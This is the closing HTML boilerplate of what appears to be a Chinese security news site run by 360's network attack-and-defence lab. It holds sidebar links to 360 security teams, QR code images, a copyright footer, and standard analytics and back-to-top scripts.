                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
